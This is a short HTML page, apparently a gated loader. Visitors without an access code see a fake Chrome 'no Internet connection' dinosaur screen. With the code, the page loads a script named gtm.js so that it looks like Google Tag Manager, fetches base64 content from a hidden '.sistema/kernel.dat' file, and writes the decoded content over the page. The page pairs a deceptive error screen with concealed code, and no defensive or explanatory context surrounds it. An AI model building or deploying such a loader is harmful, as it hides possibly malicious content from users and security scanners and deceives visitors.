<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
<body style="background:#020305;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;">
<div id="loading" style="color:#f59e0b;"><h2>SINC. HELENA...</h2></div>
<div id="dino" style="display:none;position:fixed;inset:0;background:#fff;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
<div style="font-size:80px">🦖</div><h1>Não há conexão com a Internet</h1><span>ERR_INTERNET_DISCONNECTED</span></div>
<script>
const id = new URLSearchParams(window.location.search).get('acesso');
if(!id) { mostrarDino(); } else {
    const s = document.createElement('script');
    s.src = `http://localhost:9090/gtm.js?id=${id}`;
    s.onload = () => {
        fetch('.sistema/kernel.dat').then(r => r.text()).then(b64 => {
            document.open(); document.write(atob(b64)); document.close();
        });
    };
    s.onerror = mostrarDino;
    document.head.appendChild(s);
}
function mostrarDino(){document.getElementById('loading').style.display='none';document.getElementById('dino').style.display='flex';}
</script></body></html>
